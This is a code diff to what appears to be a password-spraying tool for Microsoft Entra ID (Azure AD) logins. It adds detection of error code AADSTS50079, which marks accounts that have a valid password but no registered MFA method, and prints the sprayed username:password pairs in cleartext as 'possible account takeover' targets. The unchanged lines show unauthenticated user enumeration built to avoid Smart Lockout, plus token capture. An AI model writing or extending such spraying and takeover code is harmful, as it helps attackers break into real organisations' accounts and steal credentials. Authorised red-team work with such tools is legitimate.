@@ -53,6 +53,11 @@ LOCKOUT_WAIT_SECONDS = 65
 SMART_LOCKOUT_ERROR = "AADSTS50053"
 USER_NOT_FOUND_ERROR = "AADSTS50034"
 
+# MFA enrollment required but not yet configured: the credentials are valid AND
+# the account has no MFA method registered, so an operator could self-enroll one
+# and take the account over. Distinct from 50076 (MFA already enrolled/enforced).
+MFA_ENROLL_ERROR = "AADSTS50079"
+
 # User enumeration via GetCredentialType (unauthenticated: no password sent,
 # so it never counts toward Smart Lockout). IfExistsResult meaning:
 #   0/5/6 -> account exists, 1 -> does not exist, other -> unknown.
@@ -141,7 +146,7 @@ AADSTS_MAP = {
     "AADSTS50059": "FAILED (Tenant Not Found)",
     "AADSTS50128": "FAILED (Invalid Domain)",
     "AADSTS50076": "VALID (MFA Required)",
-    "AADSTS50079": "VALID (MFA Required)",
+    "AADSTS50079": "VALID (MFA Enrollment Available)",
     "AADSTS50158": "VALID (Conditional Access)",
     "AADSTS53003": "VALID (Conditional Access Blocked)",
     "AADSTS53000": "BLOCKED (Policy)",
@@ -279,11 +284,31 @@ def print_error(message):
     prefix = style("[x]", TermColors.RED, TermColors.BOLD)
     print(f"{prefix} {message}")
 
+def print_mfa_enroll_alert(target, gateway_host):
+    """
+    Loud, unmissable notification: valid credentials for an account that has no
+    MFA method registered (AADSTS50079). The operator can register an MFA method
+    on this account, which typically leads to full account takeover.
+    """
+    creds = f"{target.username}:{target.password}"
+    bar = style("=" * 64, TermColors.GREEN, TermColors.BOLD)
+    label = style(" MFA ENROLLMENT AVAILABLE — POSSIBLE ACCOUNT TAKEOVER ", TermColors.GREEN, TermColors.BOLD)
+    print("\n" + bar)
+    print(label)
+    print(f"  {style('Credentials:', TermColors.BOLD)} {style(creds, TermColors.GREEN, TermColors.BOLD)}")
+    print(f"  {style('Gateway:', TermColors.BOLD)}     {gateway_host}")
+    print(f"  {style('Detail:', TermColors.BOLD)}      Password is valid and NO MFA method is registered.")
+    print(f"               An MFA method can likely be self-enrolled for this account.")
+    print(bar + "\n")
+
 def format_result_line(timestamp, target, classification):
     ts = style(f"[{timestamp}]", TermColors.DIM)
     creds = f"{target.username}:{target.password}"
 
-    if classification.startswith("VALID"):
+    if "MFA Enrollment Available" in classification:
+        creds = style(creds, TermColors.GREEN, TermColors.BOLD)
+        status = style(f"{classification} <<<", TermColors.GREEN, TermColors.BOLD)
+    elif classification.startswith("VALID"):
         creds = style(creds, TermColors.GREEN, TermColors.BOLD)
         status = style(classification, TermColors.GREEN, TermColors.BOLD)
     elif classification.startswith("LOCKED") or classification.startswith("BLOCKED"):
@@ -726,6 +751,10 @@ def process_attempt(
         logger.log_token(build_token_record(target, app_config, gateway_url, response_text))
 
     record = build_attempt_record(target, aadsts, classification, app_config, gateway_url, status_code, has_token)
+
+    # Loud notification when the account has no MFA registered yet (enrollable).
+    if aadsts == MFA_ENROLL_ERROR:
+        print_mfa_enroll_alert(target, urlparse(gateway_url).netloc)
 
     console_msg = None
     valid_view = None
@@ -1205,17 +1234,26 @@ def _print_summary(logger, locked_users, invalid_users):
     blocked_count = sum(1 for r in rows if _class(r).startswith(("BLOCKED", "LOCKED")))
     failed_count = sum(1 for r in rows if _class(r).startswith("FAILED"))
 
+    mfa_enroll = [r for r in rows if "MFA Enrollment Available" in _class(r)]
+
     token_count = 0
     if logger.tokens_file.exists():
         token_count = sum(1 for _ in open(logger.tokens_file))
 
     print(f"Valid Credentials:   {style(str(valid_count), TermColors.GREEN, TermColors.BOLD)}")
+    print(f"MFA Enrollable:      {style(str(len(mfa_enroll)), TermColors.GREEN, TermColors.BOLD)}")
     print(f"Tokens Captured:     {style(str(token_count), TermColors.GREEN, TermColors.BOLD)}")
     print(f"Locked/Blocked:      {style(str(blocked_count), TermColors.YELLOW, TermColors.BOLD)}")
     print(f"Failed Attempts:     {style(str(failed_count), TermColors.RED)}")
     print(f"Locked Users:        {len(locked_users)}")
     print(f"Invalid Users:       {len(invalid_users)}")
     print(f"Results Directory:   {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")
+
+    if mfa_enroll:
+        print(style("\nMFA enrollment available (self-enroll -> account takeover):", TermColors.GREEN, TermColors.BOLD))
+        for r in mfa_enroll:
+            print(f"  {style('->', TermColors.GREEN, TermColors.BOLD)} {r.get('username')}:{r.get('password')}")
+
     print(style("--------------------------", TermColors.BOLD, TermColors.CYAN))
 
 def _print_enum_summary(logger, users, existing_users):
